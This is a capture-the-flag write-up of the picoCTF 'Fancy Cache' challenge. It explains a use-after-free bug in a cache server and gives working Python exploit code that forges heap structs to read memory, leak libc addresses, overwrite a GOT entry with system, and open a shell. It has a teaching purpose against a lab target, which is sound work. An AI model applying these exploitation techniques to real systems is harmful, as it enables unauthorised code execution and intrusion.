# Fancy Cache Writeup
##### By sdamashek of Team TJ CSL

Fancy cache revolved around exploiting a use-after-free vulnerability. We were given the server's source code, along with a client for talking to the server. 

*Note: There was an additional vulnerability that made exploitation of this challenge easier, but I didn't discover it during the competition. If you submtitted a negative lifetime (you had to use `0xffffffff` for `-1` because it was sent as an unsigned integer), the program would still free the entry, but the user could still look it up because `cache_lookup` only skipped entries with a lifetime of `0`. This writeup does not use this vulnerability.*

##### The Vulnerability
Use-after-free vulnerabilities are a general class of vulnerabilities that involve overwriting user-controlled freed memory, and then the program in question using that memory afterwards. If the program doesn't overwrite the memory after allocating it again, we can do malicious things with that data. If the data contains a program variable, we can arbitrarily change that.

So where's `free()` called in Fancy Cache?
`free()` is called only by one function in the program:

    void string_destroy(struct string *str) {
      fprintf(stderr, "free(%p) (string_destroy str)\n", str);
      free(str);
    }

Looking through the code, we can see `string_destroy` is called by `do_cache_get`:

    void do_cache_get(void) {
      ...
      if (entry->lifetime <= 0) {
        // The cache entry is now expired.
        fprintf(stderr, "Destroying key\n");
        string_destroy(entry->key);
        fprintf(stderr, "Destroying value\n");
        string_destroy(entry->value);
      }
    }

Okay, so when we get a cache entry, if it's expired, it will `free` the key and value strings. So we know where it's freeing the memory, but how can we get it to use that memory again in an exploitable way? To understand this, you first have to understand a bit about how `free` and `realloc` work.
All `free` does is, in the application's memory map, allow the location of the memory in the heap to be allocated for other uses, since it's no longer being used by the application. `realloc` changes the size of a memory block to a new specified size. While this location is generally not predictable because of ASLR, for efficiency, `realloc` will consistently reuse a recently `free`'d block if the sizes of the `free`'d block and the new size are the same. **Important note: `malloc` exhibits the same behavior, which will come into play later.**

This behavior is beneficial in our case, because even though we don't know the specific address of the `free`'d string, we know that `realloc` will put the new string at that address no matter what. But you might be asking... how does that help us? Well, lets look at where `realloc` is used:

    void read_into_string(struct string *str) {
      size_t length;
      read(STDIN_FILENO, &length, sizeof(length));
    
      str->length = length;
      if (length > str->capacity) {
        char *old_data = str->data;
        str->data = xrealloc(old_data, length);
        fprintf(stderr, "realloc(%p, %zu) = %p (read_into_string)\n", old_data, length, str->data);
        str->capacity = length;
      }
    
      read(STDIN_FILENO, str->data, length);
    }

*Note: `xrealloc` is just a wrapper around `realloc` which does basic error checking, but isn't shown here because it's not important.*

So `read_into_string` will take a `string` struct as input, and then read a length from the user for the string data. If the length read is greater than the length of the `string` struct passed, it will call `realloc` to expand the size of the `string`'s data section. Here it's helpful to know the format of a `string` struct:

    struct string {
      size_t length;
      size_t capacity;
      char *data;
    };

Alright, so one `string` struct is 12 bytes long (two 4 byte integers, and one 4 byte `char` pointer). So, if we can get something to call `read_into_string` with a `string` struct containing a `length` less than 12 after `string_destroy` was called, we can specify a `length` of 12 and then pass a raw 12 byte string in the format of a `string` struct, which will be put at the previous `string`'s address. For example, if we pass `\xff\x00\x00\x00\xff\x00\x00\x00\x61\x61\x61\x61` and the program later uses this struct, the struct will have a `length` of 255, a `capacity` of 255, and `data` will be a pointer to `0x61616161`.

Okay, so now we know how to fake a `string` struct where a `string` struct previously was located. But, we still need to trick the program into actually using that struct that we now control. Lets look at the format of a `cache_entry` struct:

    struct cache_entry {
      struct string *key;
      struct string *value;
      // The cache entry expires after it has been looked up this many times.
      int lifetime;
    };
    
Alright, so a cache entry has two `string` structs, one for `key` and one for `value`. In `do_cache_set`, a new `string` struct is always created for the key:

    struct string *key = string_create();
    read_into_string(key);
    ...
    entry->key = key;

That's always going to create a new string key, so there isn't a use-after-free vulnerability here. However, the story is different with `value`:

    if (entry->value == NULL) {
      entry->value = string_create();
    }
    read_into_string(entry->value);

If the entry's `value` pointer isn't `NULL`, it is just going to try to use the `string` struct at that pointer, even if that address has already been `free`'d.

Now lets look at where `entry` is actually defined in `do_cache_set`:

    struct cache_entry *entry = cache_lookup(key);
    if (entry == NULL) {
      // There's no existing entry for this key. Find a free slot to put
      // a new entry in.
      entry = find_free_slot();
    }
    
    struct cache_entry *find_free_slot(void) {
      size_t i;
      for (i = 0; i < kCacheSize; ++i) {
        if (cache[i].lifetime == 0) {
          return &cache[i];
        }
      }
      return NULL;
    }

Bingo! Because of how the system is set up, if a cache entry's lifetime has expired, it will reuse that entry when creating a new one. This means our exploitation process for reading memory is going to look something like this:

1. Create a cache entry with a lifetime of 1
2. Request that cache entry, thus freeing the entry because the entry has expired
3. Somehow overwrite the `free`'d `value` struct as explained above with our desired fake struct
4. Create another cache entry, which will reuse the previous cache entry
 * Will still contain the same `value` pointer, which points to the struct we overwrote with our fake malicious struct with our custom `data` pointer
5. Request the cache entry, which will access the `char` array at our custom `data pointer` and give it back to us

##### Reading kSecretString
Now that we have a basic understanding of how reading memory works, lets read `kSecretString` as the problem description tells us to. Below I'll be using code from the provided `client.py`. First off, lets get the address of `kSecretString`, which we'll later use in our `data` pointer. This can be done with gdb:

    (gdb) print/x kSecretString
    $1 = 0x8048bc8

Below, `s` is the socket connected to `vuln2014.picoctf.com:4548`, and `f` is a file interface to `s`, which the client requires.

Alright, lets start with the two items on our to-do list, creating then getting a cache entry with a `lifetime` of 1:

    assert cache_set(f,'a','bbb',1)
    print cache_get(f,'a')

The next step is to find a function which will call `read_into_string` to read into the `free`'d `value` struct. Since `cache_get` will `free` `key` first, and then `value`, our malicious string has to be the argument of the first `realloc`. Otherwise, we might overwrite `key` or a random address instead, which won't help us at all. If we use `do_cache_set`, we'll run into this issue, because it calls `string_create` before `read_into_string`. Since `string_create` allocates an empty string, the empty string will be put at the `free`'d `value`, and `read_into_string` will read the string into the `free`'d `key`, which, like I said before, won't help us.

However, `do_cache_get` only calls `string_init` on the new `key` struct, which just sets `key->data` to a `NULL` pointer. The subsequent `read_into_string` will then read a string from the user into the `free`'d `value` struct. Yay!

So now that we know what function to call, lets construct our payload. We want both `length` and `capacity` to be greater than the length of `kSecretString` so it reads enough bytes, to be safe I just defined both of them as `\xff\xff\x00\x00`, or 65535. Then, `data` needs to be a pointer to `kSecretString`, so in little endian, `\xc8\x8b\x04\x08`. So our payload is `\xff\xff\x00\x00\xff\xff\x00\x00\xc8\x8b\x04\x08`. Alright, lets do this.

    print cache_get(f,'\xff\xff\x00\x00\xff\xff\x00\x00\xc8\x8b\x04\x08')
    
Now, we want to finish off the exploit by getting enough chars to see the entire `kSecretString`. For this, I modified the `cache_set` function to accept an arbitrary length to send to the server. 280 characters is enough to see the entire `kSecretString`. As I explained above, to actually read the string we set a cache entry with this length, then get this entry:

    assert cache_set(f,'a','',1,280)
    print cache_get(f,'a')
    
So, our final program to read the value of `kSecretString` is:

    assert cache_set(f,'a','bbb',1)
    print cache_get(f,'a')
    print cache_get(f,'\xff\xff\x00\x00\xff\xff\x00\x00\xc8\x8b\x04\x08')
    assert cache_set(f,'a','',1,280)
    print cache_get(f,'a')
    
Sure enough, running this gives us `kSecretString`: "Congratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shell!"

##### Getting a shell
The page mentioned above specifies 3 steps to getting a shell:
1. Finding the address of `system` (4 bytes)
2. Replacing the GOT entry of `memcmp` with the address of `system`
3. Trigger a call to `memcmp`

The first step is quite similar to the process to read `kSecretString`, with one major difference: before we were reading memory from `.rodata`, and so when we passed the length of 280 and it tried to overwrite 280 characters at `kSecretString`, it couldn't because the memory was readonly, and so thus the data returned was untouched. The GOT however (global offset table, basically a table of jumps to functions so that the location of loaded functions can be changed without changing all the calls to the function) is readwrite, which is going to cause issues.

My hacky way of getting around this (which wouldn't have been necessary if I had used the negative lifetime bug which I mentioned before) was, since it will try to overwrite the first four bytes at whatever address I try to read from, to overwrite it with what it already is. In this case, it's the address of the memcmp GOT entry, which is `0x8048456`. Then, as far as the system knows, there's no change and everything goes fine. However, when I get the cache entry, it will return the four bytes at the address I specify, like before. The next_steps page explains how to get the address of `system` (which varies because of ASLR) and the address of `memcmp`'s GOT entry (`0x0804b014`), so I won't go into detail there. Below is the code to get the actual address of `memcmp`, and to based on `memcmp`'s offset (`0x142870`) and `system`'s offset (`0x40100`) from the base of `libc`, calculate the address of `system`.

    assert cache_set(f,'a','bbb',1)
    print cache_get(f,'a')
    print cache_get(f,'\xff\xff\x00\x00\xff\xff\x00\x00\x14\xb0\x04\x08')
    assert cache_set(f,'a','\x56\x84\x04\x08',1)
    a = unpack4(cache_get(f,'a'))
    libc_base = a-0x142870
    system = libc_base+0x00040100

After that, all I need to do is overwrite the GOT entry of memcmp with the address of `system` that I calculated. Writing isn't much different at all from reading, in fact it's easier, because now I don't need to worry about `cache_set` overwriting the value at the `data` pointer, because that's what I want it to do. Then, I need to call `memcmp` with the first argument being `/bin/sh`, so what actually gets executed is `system(/bin/sh)`. I saw `memcmp` is called in `string_eq` which is called when seeing if a cache entry exists:

    int string_eq(struct string *a, struct string *b) {
      if (a->length != b->length) {
        return 0;
      }
      return memcmp(a->data, b->data, a->length) == 0;
    }

Where `a` is the value of the cache entry, and `b` is the value of the user supplied `string` to look up. To accomplish this, I define a cache entry with a key of `/bin/sh`. I also pass the address of `system` (packed in little endian) as the value, which overwrites the GOT entry as explained above. Then all I need to do is get the cache entry `/bin/sh`, which performs `memcmp(/bin/sh,/bin/sh)` when looking up the cache entry. `thing=True` starts an interactive session by calling the below code:

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

Below is the final exploit:

    assert cache_set(f,'a','bbb',1)
    print cache_get(f,'a')
    print cache_get(f,'\xff\xff\x00\x00\xff\xff\x00\x00\x14\xb0\x04\x08')
    assert cache_set(f,'a','\x56\x84\x04\x08',1)
    a = unpack4(cache_get(f,'a'))
    libc_base = a-0x142870
    system = libc_base+0x00040100
    print cache_get(f,'\xff\xff\x00\x00\xff\xff\x00\x00\x14\xb0\x04\x08')
    assert cache_set(f,'/bin/sh',pack4(system),2)
    print cache_get(f,'/bin/sh',thing=True)

Run that, and there we go, it's a shell!

    cat /home/fancy_cache/flag.txt
    that_wasnt_so_free_after_all
